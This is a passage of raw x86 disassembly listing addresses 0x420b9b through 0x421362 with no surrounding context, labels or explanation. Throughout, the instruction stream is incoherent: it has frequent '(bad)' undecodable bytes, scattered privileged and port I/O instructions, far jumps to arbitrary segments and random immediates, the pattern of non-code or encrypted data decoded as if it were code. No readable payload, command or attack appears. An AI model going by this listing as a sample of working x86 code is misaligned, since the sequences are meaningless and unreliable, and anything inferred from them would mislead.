  420b9b:	outs   dx,BYTE PTR ds:[esi]
  420b9c:	add    BYTE PTR [eax],ah
  420b9e:	mov    edx,0x1fcf4d59
  420ba3:	jnp    0x420bd3
  420ba5:	out    dx,eax
  420ba6:	pop    ss
  420ba7:	mov    esi,0x9d4cc823
  420bac:	dec    ebx
  420bad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bae:	mov    ebp,0x250b7ceb
  420bb3:	pop    ebx
  420bb4:	dec    ecx
  420bb5:	pop    ss
  420bb6:	dec    ebx
  420bb7:	es mov ebx,0x4f007773
  420bbd:	test   eax,0xa8add343
  420bc2:	inc    DWORD PTR [edx+0x4a79a40f]
  420bc8:	inc    esi
  420bc9:	pop    eax
  420bca:	bound  edx,QWORD PTR [bx-0x6c]
  420bce:	fild   WORD PTR [eax]
  420bd0:	retf   0x45f7
  420bd3:	ss add al,0x5e
  420bd6:	xchg   ebp,eax
  420bd7:	sbb    al,0x4e
  420bd9:	cld    
  420bda:	stc    
  420bdb:	mov    dl,0x3c
  420bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bde:	dec    esp
  420bdf:	retf   0x4712
  420be2:	(bad)  
  420be3:	mov    ds:0x7f776ff6,eax
  420be8:	mov    ecx,0x15a61492
  420bed:	and    eax,0xf50c2508
  420bf2:	push   esi
  420bf3:	popf   
  420bf4:	retf   
  420bf5:	int3   
  420bf6:	aaa    
  420bf7:	shl    bh,cl
  420bf9:	mov    esp,0xc7a5c35
  420bfe:	adc    eax,0xe6e2ccce
  420c03:	ja     0x420bb6
  420c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c06:	inc    edx
  420c07:	dec    esi
  420c08:	js     0x420bc5
  420c0a:	dec    ecx
  420c0b:	push   ds
  420c0c:	into   
  420c0d:	gs retf 0x4c6e
  420c11:	int    0xa
  420c13:	xlat   BYTE PTR ds:[ebx]
  420c14:	or     eax,0xc6dde6cb
  420c19:	mov    DWORD PTR [esi],ecx
  420c1b:	jo     0x420c9c
  420c1d:	push   ecx
  420c1e:	cmc    
  420c1f:	popa   
  420c20:	jb     0x420ba2
  420c22:	adc    ah,al
  420c24:	or     al,0x9
  420c26:	rol    DWORD PTR [ebp-0x5f],1
  420c29:	je     0x420c22
  420c2b:	xchg   ecx,eax
  420c2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c2d:	lock test al,0x41
  420c30:	in     eax,dx
  420c31:	pop    es
  420c32:	mov    ch,0x55
  420c34:	pop    ebp
  420c35:	mov    eax,0x5fe2954a
  420c3a:	or     eax,0xe5a198d2
  420c3f:	cmp    DWORD PTR [ecx-0x4289d8be],0x327c62c7
  420c49:	scas   eax,DWORD PTR es:[edi]
  420c4a:	xor    DWORD PTR [ebx],edi
  420c4c:	inc    ebx
  420c4d:	xor    ch,BYTE PTR [eax+eiz*8-0x6b]
  420c51:	push   edx
  420c52:	ss push ecx
  420c54:	stos   DWORD PTR es:[edi],eax
  420c55:	cmp    eax,0x796c60c3
  420c5a:	or     eax,DWORD PTR [eax]
  420c5c:	ja     0x420c96
  420c5e:	and    BYTE PTR [edi+0x7d],ch
  420c61:	pusha  
  420c62:	mov    ds,WORD PTR [ebx-0x127d5f45]
  420c68:	xchg   edx,eax
  420c69:	repnz add eax,0x6bced21e
  420c6f:	or     eax,0x91ab0606
  420c74:	imul   esi,DWORD PTR [ebx-0x5d],0xdb2473fd
  420c7b:	mov    ebp,0xf241bd3f
  420c80:	cmovp  esi,esp
  420c83:	imul   edi,DWORD PTR [edi-0x65],0xced62c02
  420c8a:	sub    al,0x50
  420c8c:	xor    BYTE PTR [ebx],cl
  420c8e:	jmp    0x49d3:0x33805613
  420c95:	fistp  DWORD PTR [esi+0x71f725b4]
  420c9b:	out    dx,al
  420c9c:	sar    BYTE PTR [edx-0x10],0x27
  420ca0:	call   0x2689bfca
  420ca5:	push   0x857c8ae5
  420caa:	icebp  
  420cab:	pop    esi
  420cac:	mov    bh,0x8b
  420cae:	inc    edi
  420caf:	test   BYTE PTR [eax+ebx*8-0x64e4f02f],0xf6
  420cb7:	cmc    
  420cb8:	stos   BYTE PTR es:[edi],al
  420cb9:	jae    0x420c41
  420cbb:	mov    ah,0x70
  420cbd:	ja     0x420cff
  420cbf:	pushf  
  420cc0:	and    eax,DWORD PTR [ebp-0x5d]
  420cc3:	xchg   ebp,eax
  420cc4:	sti    
  420cc5:	cmp    esp,DWORD PTR [ecx+0x39]
  420cc8:	push   cs
  420cc9:	mov    cl,0x67
  420ccb:	(bad)  
  420cce:	xchg   edx,eax
  420ccf:	push   es
  420cd0:	aaa    
  420cd1:	in     eax,dx
  420cd2:	pop    ecx
  420cd3:	pop    ecx
  420cd4:	fstp   DWORD PTR [ecx+0x65f80364]
  420cda:	pusha  
  420cdb:	rcl    DWORD PTR [ecx-0x6c5cacbe],cl
  420ce1:	scas   eax,DWORD PTR es:[edi]
  420ce2:	in     eax,0x81
  420ce4:	stc    
  420ce5:	or     bh,ah
  420ce7:	jo     0x420d1a
  420ce9:	pusha  
  420cea:	mov    eax,0x135272dc
  420cef:	xchg   ebx,eax
  420cf0:	push   0xcd19d761
  420cf5:	xchg   edx,eax
  420cf6:	test   eax,0xc6d0d3df
  420cfb:	fimul  WORD PTR [ebx-0x6d4ffbb8]
  420d01:	pop    edi
  420d02:	cld    
  420d03:	inc    eax
  420d04:	rcr    bh,1
  420d06:	or     esp,DWORD PTR [ebp+0x2f4ce213]
  420d0c:	repz push ebp
  420d0e:	jl     0x420d65
  420d10:	lods   al,BYTE PTR ds:[esi]
  420d11:	fimul  WORD PTR [edi+0x2]
  420d14:	in     al,dx
  420d15:	cdq    
  420d16:	inc    esi
  420d17:	fs (bad) 
  420d19:	stc    
  420d1a:	or     bl,BYTE PTR [ecx+eax*4+0x41]
  420d1e:	pop    ds
  420d1f:	cs ja  0x420cd8
  420d22:	and    BYTE PTR [ecx+0x52],ch
  420d25:	mov    ecx,0xe7be27c9
  420d2a:	call   0xeb4ac717
  420d2f:	rol    DWORD PTR [esi],0x44
  420d32:	ss addr16 (bad) 
  420d35:	loopne 0x420d22
  420d37:	out    0x7c,al
  420d39:	inc    ah
  420d3b:	cmp    DWORD PTR [ecx-0x20],0x98baa40f
  420d42:	push   esp
  420d43:	shl    cl,cl
  420d45:	mov    fs,WORD PTR [edx-0x10]
  420d48:	mov    edi,0x7ccfc66
  420d4d:	out    0xd6,eax
  420d4f:	cmc    
  420d50:	imul   ebx,DWORD PTR gs:[edx+eiz*1+0x7986903c],0xc
  420d59:	iret   
  420d5a:	outs   dx,DWORD PTR ds:[esi]
  420d5b:	jle    0x420d63
  420d5d:	mov    ch,0x9f
  420d5f:	mov    esi,0x6d7c6b59
  420d64:	push   ds
  420d65:	pusha  
  420d66:	in     al,dx
  420d67:	adc    BYTE PTR [esi-0xb4ef959],cl
  420d6d:	sbb    edx,ebx
  420d6f:	jge    0x420cf9
  420d71:	dec    ebx
  420d72:	sbb    al,ah
  420d74:	outs   dx,DWORD PTR ds:[esi]
  420d75:	shl    DWORD PTR [ebx-0x55],1
  420d78:	adc    BYTE PTR [ebx],bh
  420d7a:	mov    ecx,0xcd2fa5e1
  420d7f:	cmp    eax,0xec1d2c09
  420d84:	call   FWORD PTR [edx-0x8]
  420d87:	adc    ebx,edi
  420d89:	(bad)  
  420d8a:	xchg   ebx,eax
  420d8b:	lahf   
  420d8c:	jg     0x420d96
  420d8e:	hlt    
  420d8f:	mov    al,ds:0x16c3326b
  420d94:	rol    BYTE PTR [eax],cl
  420d96:	push   ebx
  420d97:	or     DWORD PTR [edi+ebx*8-0x4b],0xec713a22
  420d9f:	shl    cl,cl
  420da1:	adc    BYTE PTR [ebp-0x11d50a47],cl
  420da7:	mov    ah,0x76
  420da9:	imul   edx,DWORD PTR [esp+edi*8],0x48
  420dad:	mov    cl,0x24
  420daf:	mov    edx,0x6f3061a6
  420db4:	inc    edx
  420db5:	enter  0x5637,0x33
  420db9:	js     0x420db3
  420dbb:	lods   al,BYTE PTR ds:[esi]
  420dbc:	sub    DWORD PTR [esp+eiz*8+0x234eccdb],ecx
  420dc3:	mov    ebp,?
  420dc5:	mov    cl,0x6a
  420dc7:	ins    BYTE PTR es:[edi],dx
  420dc8:	shr    ecx,1
  420dca:	test   DWORD PTR [edi-0x2c],ebx
  420dcd:	or     esi,DWORD PTR [esi]
  420dcf:	sar    DWORD PTR [ebx-0x8],cl
  420dd2:	outs   dx,BYTE PTR ds:[esi]
  420dd3:	enter  0x960c,0xb3
  420dd7:	and    esp,edx
  420dd9:	inc    ecx
  420dda:	outs   dx,DWORD PTR ds:[esi]
  420ddb:	add    dh,BYTE PTR [ebx]
  420ddd:	pop    edx
  420dde:	push   ss
  420ddf:	in     al,dx
  420de0:	sbb    eax,0xa634fdd1
  420de5:	xchg   ecx,eax
  420de6:	(bad)  
  420de7:	fadd   DWORD PTR [esi+0x2fe68e84]
  420ded:	shl    cl,cl
  420def:	fst    DWORD PTR [edi]
  420df1:	out    dx,al
  420df2:	fs fucompp 
  420df5:	call   0xba85:0x73884ac5
  420dfc:	inc    ecx
  420dfd:	aad    0x60
  420dff:	das    
  420e00:	jmp    0xeaed:0xfd5eafd5
  420e07:	icebp  
  420e08:	adc    DWORD PTR [edx],edi
  420e0a:	xchg   DWORD PTR [esi-0x2],ebx
  420e0d:	in     eax,0xec
  420e0f:	clc    
  420e10:	adc    eax,0xbf7c25d7
  420e15:	lock (bad) 
  420e17:	sub    dh,dl
  420e19:	iret   
  420e1a:	cli    
  420e1b:	or     eax,0x9009a954
  420e20:	fisttp QWORD PTR [ecx-0x19]
  420e23:	xchg   DWORD PTR [eax-0x13ac48b0],edi
  420e29:	rcr    DWORD PTR [ebx-0x2b],1
  420e2c:	ins    BYTE PTR es:[edi],dx
  420e2d:	dec    edx
  420e2e:	inc    ecx
  420e2f:	jnp    0x420e9b
  420e31:	pop    esi
  420e32:	stos   DWORD PTR es:[edi],eax
  420e33:	fstp   st(7)
  420e35:	lahf   
  420e36:	adc    al,0xb8
  420e38:	push   ecx
  420e39:	lods   eax,DWORD PTR ds:[esi]
  420e3a:	(bad)  
  420e3c:	jno    0x420e7d
  420e3e:	xchg   DWORD PTR [ecx+eax*2-0x1726aed3],ebx
  420e45:	aas    
  420e46:	cmp    cl,dh
  420e48:	cli    
  420e49:	(bad)  
  420e4b:	cdq    
  420e4c:	and    bl,cl
  420e4e:	sbb    DWORD PTR [eax-0x28d8831b],eax
  420e54:	add    eax,DWORD PTR [ecx+0x2e32d979]
  420e5a:	(bad)  
  420e5b:	in     al,0x1d
  420e5d:	sbb    DWORD PTR [ecx],ebp
  420e5f:	cmp    eax,DWORD PTR [eax+0x7807895e]
  420e65:	and    al,BYTE PTR [ebp+0x18]
  420e68:	fistp  DWORD PTR [ebx]
  420e6a:	xor    BYTE PTR [ebx],dl
  420e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e6d:	push   eax
  420e6e:	jbe    0x420e38
  420e70:	es jg  0x420e5f
  420e73:	mov    al,ds:0x5b993134
  420e78:	push   DWORD PTR [eax+0x1f]
  420e7b:	ins    BYTE PTR es:[edi],dx
  420e7c:	add    al,0xfb
  420e7e:	jae    0x420eae
  420e80:	mov    ds:0x6f5a021d,al
  420e85:	inc    ebx
  420e86:	adc    al,0x62
  420e88:	es sub eax,0x30bb528c
  420e8e:	fdiv   QWORD PTR [ebp-0x4c68d80d]
  420e94:	and    ebp,DWORD PTR [eax-0x23]
  420e97:	add    DWORD PTR [ebp+edx*1+0x35f2f1a3],0xffffffcd
  420e9f:	and    eax,ebp
  420ea1:	inc    esp
  420ea2:	sub    ecx,0x6ca7918a
  420ea8:	call   0xca9feda
  420ead:	loop   0x420e6f
  420eaf:	sbb    al,0x12
  420eb1:	js     0x420e7f
  420eb3:	push   ecx
  420eb4:	pusha  
  420eb5:	mov    al,ds:0xc577612f
  420eba:	cmp    BYTE PTR [edi-0x621715f7],dl
  420ec0:	sbb    BYTE PTR [eax+0x3b2eed39],ch
  420ec6:	dec    ebx
  420ec7:	xchg   ecx,eax
  420ec8:	lds    ebp,FWORD PTR [eax-0x63a31bab]
  420ece:	mov    eax,ds:0x608f6fb7
  420ed3:	mov    ch,0x7c
  420ed5:	jae    0x420e79
  420ed7:	cmp    eax,0xb308b0c6
  420edc:	cmp    ebp,DWORD PTR [ecx+0x0]
  420edf:	mov    al,ds:0xe88dd241
  420ee4:	pop    ebx
  420ee5:	cmp    bh,BYTE PTR [edi+0x29]
  420ee8:	xchg   ebp,eax
  420ee9:	push   ds
  420eea:	retf   0xafde
  420eed:	mov    fs,WORD PTR [esp+ebp*4-0x308dd9eb]
  420ef4:	or     edi,eax
  420ef6:	cmp    ecx,DWORD PTR [ecx+eiz*2+0x15]
  420efa:	lahf   
  420efb:	fisttp QWORD PTR [esi-0x10edccaf]
  420f01:	sub    DWORD PTR [ebp-0x60136fc4],ebp
  420f07:	ds sbb eax,0x56a5a34
  420f0d:	jl     0x420f3b
  420f0f:	jl     0x420ed4
  420f11:	add    DWORD PTR [esi-0x1f04e41c],esp
  420f17:	xchg   esi,eax
  420f18:	xor    DWORD PTR [ebp-0x80],0x1
  420f1c:	in     al,dx
  420f1d:	retf   0x778d
  420f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f21:	xor    edx,DWORD PTR [edi]
  420f23:	ins    BYTE PTR es:[edi],dx
  420f24:	push   eax
  420f25:	pop    edx
  420f26:	mov    esp,0x8a153096
  420f2b:	mov    ebp,0x7809b1d6
  420f30:	fiadd  WORD PTR [ecx]
  420f32:	and    BYTE PTR [eax-0x3fda78f1],0x21
  420f39:	pop    ds
  420f3a:	test   al,0x49
  420f3c:	inc    BYTE PTR [ebp-0x3755848f]
  420f42:	push   esp
  420f43:	push   esp
  420f44:	lods   al,BYTE PTR ds:[esi]
  420f45:	xchg   ebp,eax
  420f46:	xchg   esi,eax
  420f47:	push   esp
  420f48:	mov    ds:0xcfc333f2,al
  420f4d:	inc    esp
  420f4e:	jecxz  0x420f38
  420f50:	xor    eax,0x1c5d6172
  420f55:	mov    al,0x58
  420f57:	dec    edx
  420f58:	or     dh,BYTE PTR [ebp+eax*1+0x181f60c7]
  420f5f:	into   
  420f60:	in     al,dx
  420f61:	add    al,BYTE PTR ds:0x2f248233
  420f67:	nop
  420f68:	mov    bh,0x84
  420f6a:	pushf  
  420f6b:	and    BYTE PTR [ecx-0x47ae1e68],ah
  420f71:	dec    esp
  420f72:	shl    DWORD PTR [edx],cl
  420f74:	stos   BYTE PTR es:[edi],al
  420f75:	in     al,0xe6
  420f77:	mov    ah,0xf3
  420f79:	sahf   
  420f7a:	out    dx,eax
  420f7b:	jg     0x420f98
  420f7d:	cmc    
  420f7e:	std    
  420f7f:	or     eax,0x58c931b5
  420f84:	sub    BYTE PTR [eax-0xb],al
  420f87:	(bad)  
  420f88:	mul    ebx
  420f8a:	(bad)  
  420f8b:	ficomp DWORD PTR [edx+edi*8+0x16]
  420f8f:	add    eax,0xdb892e7a
  420f94:	bndstx ds:0x65edc2a4,(bad)
  420f9b:	mov    dl,0xae
  420f9d:	or     al,BYTE PTR [ecx]
  420f9f:	xchg   BYTE PTR [ebx+edi*2],ch
  420fa2:	cmp    eax,0x1de72bf4
  420fa7:	mov    bl,BYTE PTR [ebx+ecx*8+0x1e7333c4]
  420fae:	inc    esp
  420faf:	outs   dx,BYTE PTR ds:[esi]
  420fb0:	arpl   WORD PTR [ecx-0x77],si
  420fb3:	test   DWORD PTR ss:[ebx+0x13],ecx
  420fb7:	adc    ebx,DWORD PTR [esi]
  420fb9:	aad    0x88
  420fbb:	pop    ds
  420fbc:	add    ah,dl
  420fbe:	fwait
  420fbf:	add    edi,edi
  420fc1:	push   eax
  420fc2:	jle    0x420fdd
  420fc4:	cmp    BYTE PTR [esi],ah
  420fc6:	ror    DWORD PTR [esi-0x1ad425ba],1
  420fcc:	inc    esp
  420fcd:	xor    eax,DWORD PTR [edi+0x535ccee6]
  420fd3:	shl    esi,cl
  420fd5:	xor    esi,DWORD PTR [esi+0x1a]
  420fd8:	sbb    esi,ebx
  420fda:	adc    edi,DWORD PTR [ecx-0x5d]
  420fdd:	leave  
  420fde:	push   ebp
  420fdf:	psrad  mm7,QWORD PTR [ecx]
  420fe2:	lds    eax,FWORD PTR [ecx]
  420fe4:	or     dh,BYTE PTR [edx+0x62]
  420fe7:	add    eax,0xb4c9df10
  420fec:	retf   
  420fed:	mov    eax,ds:0xa31143cc
  420ff2:	arpl   dx,ax
  420ff4:	(bad)
  420ff8:	sub    eax,0xebff9369
  420ffd:	hlt    
  420ffe:	push   es
  420fff:	add    al,0xf5
  421001:	add    eax,0x39d7fc4f
  421006:	inc    ecx
  421007:	sbb    ch,BYTE PTR [ebx]
  421009:	sub    al,0x1b
  42100b:	idiv   DWORD PTR [ebp-0x12fe8e50]
  421011:	dec    ebp
  421012:	pop    es
  421013:	cmc    
  421014:	inc    esp
  421015:	and    eax,0xdacc8989
  42101a:	sbb    bl,BYTE PTR [edi+esi*1-0x70a37406]
  421021:	pop    ecx
  421022:	inc    edi
  421023:	sbb    BYTE PTR [eax-0x4a5b5842],ch
  421029:	inc    esi
  42102a:	pop    ds
  42102b:	jg     0x420fd3
  42102d:	leave  
  42102e:	jnp    0x42101e
  421030:	sbb    bl,BYTE PTR [edi+0x1f8c7ba5]
  421036:	aaa    
  421037:	xor    eax,0x4a6c67a0
  42103c:	push   ss
  42103d:	mov    eax,ds:0xe399ff17
  421042:	ins    DWORD PTR es:[edi],dx
  421043:	test   BYTE PTR [ecx],dl
  421045:	test   al,0xb4
  421047:	mov    bh,0xe5
  421049:	out    dx,eax
  42104a:	dec    eax
  42104b:	es cwde 
  42104d:	adc    esi,edx
  42104f:	push   edi
  421050:	rol    BYTE PTR [edi-0x64],1
  421053:	and    edx,ebp
  421055:	jns    0x4210d2
  421057:	test   eax,0x176a379c
  42105c:	sub    al,BYTE PTR [ebp+0x20]
  42105f:	(bad)  
  421060:	xor    eax,0x2198e7b
  421065:	and    DWORD PTR [ecx],0xffffff92
  421068:	(bad)  
  421069:	mov    bl,0x8a
  42106b:	out    dx,al
  42106c:	lds    edx,FWORD PTR [edx]
  42106e:	or     bh,BYTE PTR [ecx-0x589aa7ac]
  421074:	popa   
  421075:	add    al,0x93
  421077:	push   ecx
  421078:	ret    
  421079:	and    BYTE PTR [eax+edi*4],0xfa
  42107d:	fs out dx,eax
  42107f:	test   bh,cl
  421081:	mov    fs,eax
  421083:	stos   DWORD PTR es:[edi],eax
  421084:	sub    eax,0xa404c1e9
  421089:	jp     0x42100c
  42108b:	xor    DWORD PTR [ebx+0x0],edx
  42108e:	adc    BYTE PTR [edi-0x6a2e904],0xec
  421095:	adc    ecx,0x9866d34d
  42109b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42109c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42109d:	jae    0x4210b2
  42109f:	adc    DWORD PTR ss:[edx+eiz*8-0x10],ebp
  4210a4:	mov    dh,0x66
  4210a6:	xchg   ecx,eax
  4210a7:	push   es
  4210a8:	mov    bl,0x29
  4210aa:	dec    eax
  4210ab:	imul   ecx,DWORD PTR [ebx+0x76815705],0xffffff9b
  4210b2:	fsub   DWORD PTR [esi+edi*1+0x71]
  4210b6:	cmp    ah,BYTE PTR [ebp-0x6f]
  4210b9:	inc    edi
  4210ba:	mov    cl,0xc3
  4210bc:	mov    eax,ds:0x5f21c5fc
  4210c1:	imul   edx,DWORD PTR [ebx],0x49
  4210c4:	xor    BYTE PTR [esi],dh
  4210c6:	jecxz  0x421092
  4210c8:	xchg   esp,edx
  4210ca:	cmc    
  4210cb:	ds lock out dx,eax
  4210ce:	aad    0x6
  4210d0:	sti    
  4210d1:	jmp    0x42110d
  4210d3:	push   ds
  4210d4:	aas    
  4210d5:	inc    esi
  4210d6:	outs   dx,DWORD PTR ds:[esi]
  4210d7:	es xchg esp,eax
  4210d9:	call   0x1738a3d7
  4210de:	cs lahf 
  4210e0:	cld    
  4210e1:	or     al,0x0
  4210e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210e4:	fstp   DWORD PTR [ebp+0x53]
  4210e7:	pop    es
  4210e8:	xor    dh,BYTE PTR [edi]
  4210ea:	or     BYTE PTR [ebp+0xed2cef9],0x26
  4210f1:	or     eax,0xa8a40eae
  4210f6:	cmp    edx,DWORD PTR [esp+edx*2-0x34]
  4210fa:	(bad)  
  4210fb:	test   BYTE PTR [ecx+0xe],bl
  4210fe:	add    edx,esi
  421100:	scas   al,BYTE PTR es:[edi]
  421101:	jg     0x4210aa
  421103:	or     al,0x7e
  421105:	mov    BYTE PTR [ebp-0x2fc915ed],al
  42110b:	push   es
  42110c:	xchg   DWORD PTR [ebx-0x6e],edx
  42110f:	add    dl,BYTE PTR [ebx+eiz*2]
  421112:	pop    ss
  421113:	and    al,0x6d
  421115:	inc    ebp
  421116:	jmp    0x42116d
  421118:	scas   eax,DWORD PTR es:[edi]
  421119:	mov    ds:0xe6aa55dc,al
  42111e:	xor    ch,BYTE PTR [esi+edi*2+0x78f1404e]
  421125:	fwait
  421126:	jge    0x4210cf
  421128:	int3   
  421129:	jb     0x4210fe
  42112b:	jae    0x4210b8
  42112d:	and    BYTE PTR [ebx+0x65c1addc],ah
  421133:	call   0x51520610
  421138:	mov    eax,ds:0xe4f72ab1
  42113d:	les    edi,FWORD PTR [edi+0x1764c033]
  421143:	xor    BYTE PTR [edi+0x32],ch
  421146:	rcr    BYTE PTR [ecx],1
  421148:	imul   edx,ebx,0xf1ca2360
  42114e:	push   0xfffffffa
  421150:	adc    BYTE PTR [eax+0x59],dh
  421153:	cmp    eax,0xe0a71c05
  421158:	jmp    0xaf6d:0x4eb76e62
  42115f:	aad    0x27
  421161:	fndisi(8087 only) 
  421163:	test   BYTE PTR [ecx],0xc
  421166:	scas   al,BYTE PTR es:[edi]
  421167:	push   ds
  421168:	push   esi
  421169:	into   
  42116a:	push   0xce8c6226
  42116f:	loope  0x421124
  421171:	pop    esp
  421172:	stos   BYTE PTR es:[edi],al
  421173:	and    bh,BYTE PTR [ebp+0x5c]
  421176:	fbld   TBYTE PTR [eax+0x72]
  421179:	fadd   DWORD PTR ds:0xe6b89f7b
  42117f:	scas   eax,DWORD PTR es:[edi]
  421180:	inc    esi
  421181:	dec    eax
  421182:	leave  
  421183:	lods   al,BYTE PTR ds:[esi]
  421184:	imul   ecx,DWORD PTR [esi-0x79],0xffffff9c
  421188:	sbb    bl,BYTE PTR [edx-0x4e]
  42118b:	pop    esp
  42118c:	push   0xffffffb2
  42118e:	push   0xbe7a9f42
  421193:	call   0x664d:0x9bd25528
  42119a:	jb     0x42118f
  42119c:	sbb    ebp,DWORD PTR [edi+esi*2+0x71857456]
  4211a3:	lock push es
  4211a5:	mov    dl,0xc7
  4211a7:	push   esi
  4211a8:	sbb    esi,DWORD PTR [edx]
  4211aa:	out    dx,al
  4211ab:	(bad)  
  4211ac:	fnstsw WORD PTR [edx+0xa01318e]
  4211b2:	inc    ecx
  4211b3:	push   ds
  4211b4:	mov    dl,0xf2
  4211b6:	js     0x4211a1
  4211b8:	test   BYTE PTR [ebp+0x1f58e0fa],bl
  4211be:	sbb    eax,0x6ee9352e
  4211c3:	xchg   esp,eax
  4211c4:	lock add edx,DWORD PTR [edi]
  4211c7:	and    eax,ebx
  4211c9:	icebp  
  4211ca:	test   DWORD PTR [ebx],ecx
  4211cc:	mov    ah,0xf6
  4211ce:	out    0xac,al
  4211d0:	scas   al,BYTE PTR es:[edi]
  4211d1:	adc    eax,0x1389df1
  4211d6:	ror    DWORD PTR [edx-0x76],1
  4211d9:	stos   DWORD PTR es:[edi],eax
  4211da:	scas   al,BYTE PTR es:[edi]
  4211db:	fsub   QWORD PTR [eax-0x61]
  4211de:	cli    
  4211df:	mov    ch,0x98
  4211e1:	int    0xc7
  4211e3:	dec    edi
  4211e4:	adc    cl,bl
  4211e6:	mov    ecx,0x28cb3d78
  4211eb:	aad    0xdb
  4211ed:	cli    
  4211ee:	das    
  4211ef:	enter  0x39ea,0x0
  4211f3:	lea    esi,[ecx+ecx*8]
  4211f6:	loopne 0x421204
  4211f8:	and    ebx,DWORD PTR [esi+0x37b61d43]
  4211fe:	or     eax,0xf7396d4a
  421203:	adc    al,0x38
  421205:	(bad)  
  421206:	jp     0x4211f9
  421208:	call   0xecb8:0x1f46b7aa
  42120f:	xchg   BYTE PTR [ebx],dh
  421211:	push   edi
  421212:	neg    DWORD PTR [eax]
  421214:	adc    bh,BYTE PTR ds:0x4e6d3a0e
  42121a:	add    eax,0x46abb815
  42121f:	mov    ds:0x2634cf63,al
  421224:	dec    esi
  421225:	in     al,0x23
  421227:	rol    DWORD PTR [ebx],cl
  421229:	cmp    BYTE PTR [esp+eiz*2-0x67ece632],al
  421230:	mov    cl,0xd
  421232:	sbb    al,0x49
  421234:	inc    esi
  421235:	scas   eax,DWORD PTR es:[edi]
  421236:	sbb    esp,DWORD PTR [edi+0x3f]
  421239:	xlat   BYTE PTR ds:[ebx]
  42123a:	(bad)  
  42123b:	scas   al,BYTE PTR es:[edi]
  42123c:	xor    cl,ah
  42123e:	imul   esp,DWORD PTR [ecx+0x1b],0x586f5156
  421245:	jl     0x421290
  421247:	in     eax,dx
  421248:	adc    cl,BYTE PTR [edx-0x7b]
  42124b:	ds inc edx
  42124d:	imul   edi,DWORD PTR [ebx],0xe9ba224e
  421253:	out    dx,eax
  421254:	gs in  eax,dx
  421256:	jne    0x4212d2
  421258:	imul   esp,DWORD PTR [ebx+edi*2],0xffffff81
  42125c:	ret    
  42125d:	push   ebx
  42125e:	stc    
  42125f:	rcl    DWORD PTR [eax],cl
  421261:	cmp    DWORD PTR [ecx+0x3e],0xffffff88
  421265:	xor    DWORD PTR [esp+ecx*4+0x2b],esp
  421269:	inc    edx
  42126a:	pop    esi
  42126b:	stos   DWORD PTR es:[edi],eax
  42126c:	jae    0x42126b
  42126e:	or     cl,BYTE PTR [esi]
  421270:	sbb    esi,ecx
  421272:	ss pop edx
  421274:	jae    0x421261
  421276:	int    0x3d
  421278:	fnstsw WORD PTR [ebp+0x49]
  42127b:	mov    WORD PTR [ebx+0x1f],?
  42127e:	jbe    0x421256
  421280:	sbb    edi,0x75
  421283:	jge    0x42127e
  421285:	arpl   WORD PTR [edx-0x3],sp
  421288:	and    DWORD PTR [ebp-0x7c7cf7a1],edi
  42128e:	outs   dx,BYTE PTR ds:[esi]
  42128f:	or     BYTE PTR [esi+edi*4+0x2d],ch
  421293:	adc    DWORD PTR [ebp-0x497caae2],ebp
  421299:	pop    edi
  42129a:	push   ebp
  42129b:	mov    ebp,0x3c475e7
  4212a0:	and    eax,0xee0e7cab
  4212a5:	and    BYTE PTR [ebx],bh
  4212a7:	loopne 0x42122a
  4212a9:	dec    eax
  4212aa:	sbb    DWORD PTR [ecx+0x29f19d06],edi
  4212b0:	pop    ds
  4212b1:	dec    esp
  4212b2:	or     bh,dl
  4212b4:	mov    bl,bl
  4212b6:	pop    ss
  4212b7:	or     DWORD PTR [esi+0x48],eax
  4212ba:	ret    0xe01f
  4212bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212be:	cs mov edi,0x44f9c6cd
  4212c4:	mov    BYTE PTR [ebx+0x76f1cc84],0xc0
  4212cb:	pop    esi
  4212cc:	mov    WORD PTR [edx+0x6d],ds
  4212cf:	test   DWORD PTR [ecx],0x1336c6d4
  4212d5:	mov    eax,ds:0x6440312e
  4212da:	sbb    cl,BYTE PTR [edx+0x48677514]
  4212e0:	xor    al,0x14
  4212e2:	ins    BYTE PTR es:[edi],dx
  4212e3:	or     DWORD PTR ds:0x6de78cd1,ebp
  4212e9:	repnz push 0xa4138eda
  4212ef:	mov    esp,0xea14d96f
  4212f4:	mov    ds,WORD PTR [edi]
  4212f6:	aam    0x7b
  4212f8:	aam    0xd6
  4212fa:	jmp    0x4212ac
  4212fc:	cli    
  4212fd:	mov    ch,BYTE PTR [esi-0x68b43922]
  421303:	int3   
  421304:	and    ch,BYTE PTR [edi-0x38]
  421307:	add    al,0x14
  421309:	rcr    DWORD PTR [edx+0x66],1
  42130c:	iret   
  42130d:	adc    al,0x7c
  42130f:	inc    ecx
  421310:	inc    ebx
  421311:	sub    eax,0x374942ba
  421316:	sub    DWORD PTR ds:0x5fa5e797,0x65
  42131d:	fbld   TBYTE PTR [eax-0x4c]
  421320:	pop    edx
  421321:	jno    0x421357
  421323:	out    dx,eax
  421324:	dec    edi
  421325:	lods   eax,DWORD PTR ds:[esi]
  421326:	mov    esp,0x9c400016
  42132b:	scas   eax,DWORD PTR es:[edi]
  42132c:	scas   al,BYTE PTR es:[edi]
  42132d:	into   
  42132e:	add    ebp,edi
  421330:	push   edi
  421331:	jmp    DWORD PTR [edx]
  421333:	push   0x7e
  421335:	adc    BYTE PTR [ecx+0x28],bh
  421338:	mov    al,ds:0x56df22e9
  42133d:	test   DWORD PTR [esi-0x5c],esp
  421340:	jo     0x4213b8
  421342:	dec    edi
  421343:	std    
  421344:	jae    0x4212dc
  421346:	pushf  
  421347:	and    esi,DWORD PTR [ebp-0x68]
  42134a:	push   ss
  42134b:	push   cs
  42134c:	cmp    al,0x81
  42134e:	xchg   esi,eax
  42134f:	cmp    BYTE PTR [ebp+0x55bd52ae],dh
  421355:	pop    edi
  421356:	retf   
  421357:	jae    0x42132c
  421359:	jb     0x4213cf
  42135b:	(bad)  
  42135c:	shr    dh,cl
  42135e:	or     ebp,edx
  421360:	fisttp WORD PTR [esi]
  421362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
